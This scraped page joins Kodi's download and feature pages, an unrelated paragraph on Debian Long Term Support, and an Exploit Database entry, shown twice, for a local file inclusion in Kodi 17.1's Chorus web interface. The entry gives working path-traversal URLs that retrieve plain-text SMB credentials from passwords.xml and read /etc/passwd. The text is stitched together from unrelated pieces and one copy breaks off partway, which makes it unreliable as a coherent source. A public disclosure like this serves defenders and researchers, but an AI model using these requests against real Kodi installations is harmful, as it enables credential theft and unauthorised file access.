# Downloading Kodi

## Join the millions already enjoying Kodi

Kodi is available as a native application for Android, Linux, Mac OS X, iOS and Windows operating systems, running on most common processor architectures. A small overview of the features can be found on our about page. For each platform, we offer a stable and development release(s). For normal users we recommend installing the stable releases.

### Notice

The official Kodi version does not contain any content whatsoever. This means that you should provide your own content from a local or remote storage location, DVD, Blu-Ray or any other media carrier that you own. Additionally Kodi allows you to install third-party plugins that may provide access to content that is freely available on the official content provider website. The consumption of pirated content which would otherwise need to be paid for is not endorsed or approved by Team Kodi.

## Older Releases

Please note, development of the v20 "Nexus" line has ended. If you discover a bug in v20, please test if the bug is also present in v21 "Omega" and submit your bug report for v21 if present. While we do not recommend using old builds, you can [download an old build](http://mirrors.kodi.tv/releases/) from our mirrors site if you need to.

## Source Code

Current development is done in our git repository. The source can be viewed online, downloaded, or cloned from our github repository:

```
$ git clone https://github.com/xbmc/xbmc.git

```
## We need your help

You can help in so many different ways. As you may or may not know, Kodi is maintained completely by volunteers and we need and value any contributions to the project. If you can code, we are always [on the lookout for new team members](/contribute/developers) to assist with development. Even if you don't code, you can [help others in the forum](https://forum.kodi.tv/), [assist with quality assurance testing](https://kodi.wiki/view/HOW-TO%3AHelp_with_quality_assurance_testing), or [contibute to language translations](https://kodi.wiki/view/Translation_System). If you are pressed for time but still want to give back, then you can [donate](/donate) or [purchase some great Kodi merchandise](/store).

# Debian Long Term Support

Debian Long Term Support (LTS) is a project to extend the lifetime of all Debian stable releases to (at least) 5 years. Debian LTS is not handled by the Debian Security and Release teams, but by a separate group of volunteers and companies interested in making it a success.

Thus the Debian LTS team takes over security maintenance of the various releases once the Debian Security team stops its work.

## Got a smart TV? You ain't seen nothin’ yet!

Kodi puts your smart TV to shame. Kodi plays almost every kind of media you can find and looks great while doing it! Here are just a few things Kodi excels at:

![](/images/about--music.webp)

Music

Your music collection has never looked this good! Support for
almost every format, playlists, party mixes and more.

![](/images/about--movies.webp)

Movies

So much better than a pile of DVDs on a shelf. Kodi brings your
movie collection to life with artwork, cast, genres and more.

![](/images/about--tvshows.webp)

TV Shows

Perfect for binge watching or the occasional catch up on your
favourite show. Kodi keeps all your TV organised like nothing
else.

![](/images/about--photos.webp)

Photos

Kodi is the best way to share your photos on the biggest screen
in the house with a personal slideshow.

![](/images/about--pvr.webp)

PVR

Kodi allows you to watch and record live TV all from an easy to
use interface. It works with a number of popular backends
including MediaPortal, MythTV, NextPVR, Tvheadend and many more.

![](/images/about--games.webp)

Games

Kodi isn't just for passive entertainment media. You can also
play games on Kodi. Pick from a large number of emulators, or
even play a stand-alone game. There's even extensive support for
game controllers.

## But wait, there's more!

You can get a new skin to change the look of Kodi, or maybe you want to stream your favourite internet radio station and control it all with your web browser or mobile phone? This and so much more is all possible and easy with Kodi.

**EDB Verified:**

#### Author:

###### [Eric Flokstra](/?author=7093)

**Vulnerable App:**

```
# Exploit Title: Kodi - Local File Inclusion
# Date: 12 February 2017
# Exploit Author: Eric Flokstra
# Vendor Homepage: https://kodi.tv/
# Software Link: https://kodi.tv/download/
# Version: Kodi version 17.1 (Krypton), Chorus version 2.4.2
# Tested on: Linux

Kodi (formerly XBMC) is a free and open-source media player software
application developed by the XBMC Foundation. Chorus is a web interface
for controlling and interacting with Kodi. It is hosted by the Kodi
installation.

The web interface loads a thumbnail of an image, video or add-on when
selecting a category in the left menu with the following request:

http://192.168.1.25:8080/image/image%3A%2F%2F%252fhome%252fosmc%252f.kodi%252faddons%252fplugin.video.vice%252ficon.png%2F

Insufficient validation of user input is performed on this URL resulting
in a local file inclusion vulnerability. This enables attackers
to retrieve arbitrary files from the filesystem by changing the location
after the '/image/image%3A%2F%2F’ part.

<--Examples-->

1) If Kodi is connected to a NAS the following request can be used to obtain plain text SMB credentials:

http://192.168.1.25:8080/image/image%3A%2F%2F%2e%2e%252fhome%252fosmc%252f.kodi%252fuserdata%252fpasswords.xml

Response:

<passwords><path><from pathversion="1">smb://192.168.1.15/</from><to
pathversion="1">smb://username:password@192.168.1.15//share</to></path></passwords>

2) Request to retrieve the content of /etc/passwd:

http://192.168.1.25:8080/image/image%3A%2F%2F%2e%2e%252fetc%252fpasswd

Response:

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# [Kodi v17.1] - Local File Inclusion

# Exploit Title: Kodi - Local File Inclusion
# Date: 12 February 2017
# Exploit Author: Eric Flokstra
# Vendor Homepage: <https://kodi.tv/>
# Software Link: <https://kodi.tv/download/>
# Version: Kodi version 17.1 (Krypton), Chorus version 2.4.2
# Tested on: Linux
# CVE: CVE-2017-5982

Kodi (formerly XBMC) is a free and open-source media player software
application developed by the XBMC Foundation. Chorus is a web interface
for controlling and interacting with Kodi. It is hosted by the Kodi
installation.

The web interface loads a thumbnail of an image, video or add-on when
selecting a category in the left menu with the following request:

[http://192.168.1.25:8080/image/image%3A%2F%2F%252fhome%252fosmc%252f.kodi%252faddons%252fplugin.video.vice%252ficon.png%2F](http://192.168.1.25:8080/image/image%3A//%252fhome%252fosmc%252f.kodi%252faddons%252fplugin.video.vice%252ficon.png/)

Insufficient validation of user input is performed on this URL resulting
in a local file inclusion vulnerability. This enables attackers
to retrieve arbitrary files from the filesystem by changing the location
after the '/image/image%3A%2F%2F’ part.

<--Examples-->

1) If Kodi is connected to a NAS the following request can be used to
obtain plain-text SMB credentials:

[http://192.168.1.25:8080/image/image%3A%2F%2F%2e%2e%252fhome%252fosmc%252f.kodi%252fuserdata%252fpasswords.xml](http://192.168.1.25:8080/image/image%3A//..%252fhome%252fosmc%252f.kodi%252fuserdata%252fpasswords.xml)

Response:

<passwords><path><from pathversion="1">smb://192.168.1.15/</from><to
pathversion="1">smb://username:password@192.168.1.15//share</to></path></passwords>

2) Request to retrieve the content of /etc/passwd:

[http://192.168.1.25:8080/image/image%3A%2F%2F%2e%2e%252fetc%252fpasswd](http://192.168.1.25:8080/image/image%3A//..%252fetc%252fpasswd)
